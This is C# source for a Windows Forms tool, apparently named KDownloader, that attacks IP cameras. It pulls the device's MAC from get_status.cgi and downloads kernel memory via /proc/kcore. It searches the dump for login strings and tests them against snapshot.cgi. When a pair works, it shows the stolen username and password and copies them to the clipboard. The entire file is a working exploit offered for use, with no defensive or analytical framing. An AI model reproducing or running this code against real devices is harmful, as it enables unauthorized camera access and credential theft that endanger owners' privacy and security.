using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KDownloader_Recoded
{
    public partial class kcore : Form
    {
        public kcore(string getNextIp = "")
        {
            InitializeComponent();
        }

        //thanks Joe!
        //implementation by me
        public string returnNextIp { get; set; }
        public string getNextIp = "";

        public List<Byte> memDat = new List<Byte> { };
        public TimeWebClient w = new TimeWebClient();
        public string ipAddr = "";
        public string path = "";
        public Random rnd = new Random();
        public Thread dl;
        public Thread handler;
        public string fileName = "";
        public string macAddr = "";
        public string username = "";
        public string password = "";
        public string[] rawSplit;
        public int extCount = 0;
        public int curOffset = 3;
        bool set = false;

        private void btn_attack_Click(object sender, EventArgs e)
        {
            try
            {
                lb_console.Items.Clear();

                ipAddr = tb_ipaddr.Text;
                ipAddr = processIP();
                getMacAddr();
                startMemDatDl();
            }
            catch
            {
                print(Color.Red, "Camera down or patched.");
            }
        }
        private void kcore_Load(object sender, EventArgs e)
        {
            path = new FileInfo(Assembly.GetEntryAssembly().Location).Directory.ToString();
        }
        public void startMemDatDl()
        {
            if(macAddr == "err")
            {
                return;
            }
            rndFuncs rn = new rndFuncs();
            string rndFilePref = rn.RandomString(5);
            dl = new Thread(() => {
                this.BeginInvoke((MethodInvoker)delegate {
                    btn_attack.Enabled = false;
                });
                w.DownloadProgressChanged += new DownloadProgressChangedEventHandler(client_DownloadProgressChanged);
                w.DownloadFileCompleted += new AsyncCompletedEventHandler(client_DownloadFileCompleted);               
                w.DownloadFileAsync(new Uri(ipAddr + "//proc/kcore"), path + "/" + rndFilePref + "_memory.dmp");
                fileName = path + "/" + rndFilePref + "_memory.dmp";
            });
            dl.IsBackground = true;
            dl.Start();
        }

        public void client_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            this.BeginInvoke((MethodInvoker)delegate {

                failsafeTimer.Stop();
                failsafeTimer.Start();
                print(Color.Black, "Downloading data: " + e.BytesReceived / 1024 + "KB");

                if(e.BytesReceived > 4500000)
                {
                    w.CancelAsync();
                    Thread.Sleep(500);
                }
            });
        }
        public void client_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
            failsafeTimer.Stop();
            print(Color.DarkGreen, "Downloading data: Done");
            scanMemData();
        }
        public void scanMemData()
        {
            memDat = File.ReadAllBytes(fileName).ToList();
            byte[] printables = new byte[] { 27, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x5c, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e };
            List<Byte> buffer = new List<Byte> { };
            bool swit = true;

            foreach(byte b in memDat)
            {
                if (printables.Contains(b))
                {
                    buffer.Add(b);
                    swit = true;
                }
                else
                {
                    if (swit)
                    {
                        buffer.Add(0x00);
                        swit = false;
                    }
                }
            }

            string raw = Encoding.UTF8.GetString(buffer.ToArray());
            rawSplit = raw.Split((char)0x00);

            List<String> possibleMacAddress = new List<String> { };

            bool found = false;
            List<String> strDump = new List<String> { };

            foreach (string s in rawSplit)
            {
                if(s == macAddr)
                {
                    print(Color.Green, "MAC Found - Testing possible creds");


                    if ((rawSplit.Length - extCount) > 15)
                    {
                        for (int i = 0; i < 15; i++)
                        {
                            strDump.Add(rawSplit[extCount + i]);
                        }
                    }
                    else
                    {
                        for (int i = 0; i < (rawSplit.Length - extCount); i++)
                        {
                            strDump.Add(rawSplit[extCount + i]);
                        }
                    }

                    for(int i = 0; i < strDump.Count() - 1; i++)
                    {
                        if (testPossibleCreds(strDump[i], strDump[i + 1]))
                        {
                            username = strDump[i];
                            password = strDump[i + 1];
                            found = true;
                            announceFoundCreds();
                            break;
                        }
                    }

                    break;
                }
                if(s.Length == 12)
                {
                    possibleMacAddress.Add(s);
                }
                extCount++;
            }

            if (strDump.Count == 0)
            {
                print(Color.Red, "No data. Probably patched.");
            }
            if (!found && (strDump.Count != 0))
            {
                print(Color.Red, "Search failed. Press [M] to find manually.");
            }

        }

        public void announceFoundCreds()
        {
            print(Color.Green, "PASSWORD: " + password);
            print(Color.Green, "USERNAME: " + username);
            print(Color.DarkRed, "Not working? Press [M]");
        }

        public void getMacAddr()
        {
            string dat = Encoding.UTF8.GetString(w.DownloadData(ipAddr + "/get_status.cgi"));
            string[] split = dat.Split(new string[] { "var" }, StringSplitOptions.None);
            string foundMac = "";
            bool isFound = false;
            foreach (string s in split)
            {
                if (s.Contains("id="))
                {
                    foundMac = s.Substring(5, 12);
                    foundMac = Regex.Replace(foundMac, @"[^\u0000-\u007F]+", string.Empty);
                    isFound = true;
                }
            }
            if (isFound)
            {
                macAddr = foundMac;
                print(Color.Green, "Mac is known: " + foundMac);
            }
            else
            {
                macAddr = "err";
                print(Color.Red, "Mac could not be located.");
            }
        }

        private void lb_draw(object sender, DrawItemEventArgs e)
        {
           colourItem item = lb_console.Items[e.Index] as colourItem;
           if (item != null)
           {
                Bitmap tmbmp = new Bitmap(1, 1);
                Graphics g = Graphics.FromImage(tmbmp);

                int width = (int)g.MeasureString(item.Message, lb_console.Font).Width;
                e.Graphics.DrawString(item.Message, lb_console.Font, new SolidBrush(item.ItemColor), ((lb_console.Width / 2) - (width / 2)), e.Index * lb_console.ItemHeight);

                g.Dispose();
                tmbmp.Dispose();
           }
           else
           {

           }        
        }

        public string processIP()
        {
            string tmp;
            tmp = ipAddr.Replace("http://", "");
            tmp = tmp.Replace("https://", "");
            tmp = tmp.Replace("/", "");
            tmp = "http://" + tmp;
            return tmp;
        }

        public void print(Color c, string text)
        {
            if (this.IsHandleCreated)
            {
                this.Invoke(new MethodInvoker(delegate ()
                {
                    lb_console.Items.Insert(0, new colourItem(c, text));
                }));
            }
        }

        public bool testPossibleCreds(string user, string pass)
        {
            w.Credentials = new NetworkCredential(user, pass);
            try
            {
                byte[] dldata = w.DownloadData(ipAddr + "/snapshot.cgi");
                setExImg(dldata);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private void kcore_kp(object sender, KeyPressEventArgs e)
        {
            if(e.KeyChar == 'm')
            {
                //messy bullshit, dont care
                if(rawSplit != null && rawSplit.Length != 0)
                {
                    List<String> strDump = new List<String> { };
                    List<String> strDumpProcessed = new List<String> { };
                    int count = 0;

                    if ((rawSplit.Length - extCount) > 15)
                    {
                        for (int i = 0; i < 15; i++)
                        {
                            count++;
                            strDump.Add(i + " " + rawSplit[extCount + i]);
                        }
                    }
                    else
                    {
                        for (int i = 0; i < (rawSplit.Length - extCount); i++)
                        {
                            count++;
                            strDump.Add(i + " " + rawSplit[extCount + i]);
                        }
                    }

                    int longest = 0;
                    foreach(string s in strDump)
                    {
                        if(s.Length > longest)
                        {
                            longest = s.Length;
                        }
                    }

                    for(int i = 0; i < count; i++)
                    {
                        string itm = rawSplit[extCount + i];

                        StringBuilder sb = new StringBuilder(itm);
                        sb.Insert(0, ".", (longest - itm.Length));

                        strDumpProcessed.Add(i + " " + sb.ToString());
                    }

                    strDumpProcessed.Reverse();
                    strDumpProcessed.Add("===STRING DUMP===");

                    foreach (String s in strDumpProcessed)
                    {
                        print(Color.Black, s);
                    }
                }
            }
            if(e.KeyChar == 'u')
            {
                if(username != "")
                {
                    Clipboard.SetText(username);
                }
            }
            if(e.KeyChar == 'p')
            {
                if(password != "")
                {
                    Clipboard.SetText(password);
                }
            }
        }

        public void setExImg(byte[] dldata)
        {
            Bitmap bmp;
            using (var ms = new MemoryStream(dldata)){ bmp = new Bitmap(ms); }
            successPB.Image = bmp;
        }

        private void btn_cut_Click(object sender, EventArgs e)
        {
            w.CancelAsync();
        }

        private void failsafeTimer_Tick(object sender, EventArgs e)
        {
            //due to the broken nature of this exploit, the camera can report a large file but only send a small amount of data
            //if no data is recieved for 5 seconds, we assume the camera has died and end the download process
            print(Color.Orange, "Download was closed early.");
            w.CancelAsync();
            failsafeTimer.Stop();
        }
    }
}
